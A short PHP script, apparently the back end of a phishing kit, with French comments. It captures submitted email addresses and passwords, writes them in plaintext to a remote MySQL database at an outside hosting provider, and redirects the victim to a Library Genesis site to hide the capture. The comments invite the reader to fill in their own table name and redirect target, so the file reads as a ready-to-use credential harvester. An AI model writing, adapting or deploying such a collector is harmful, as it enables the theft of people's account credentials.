<?php

$bdd = new PDO('mysql:host=fdb22.awardspace.net;port=3306;dbname=db_name', 'user', 'password');
$req = $bdd->prepare('INSERT INTO table_name (email,password) VALUES (?,?)');  #table_name: le nom de votre table au sein de votre db
$req->execute(array($_POST['email'],$_POST['password']));
header("Location: http://gen.lib.rus.ec/ ");     #redirection vers library genisis, vous pouvez changer la destination.
?>
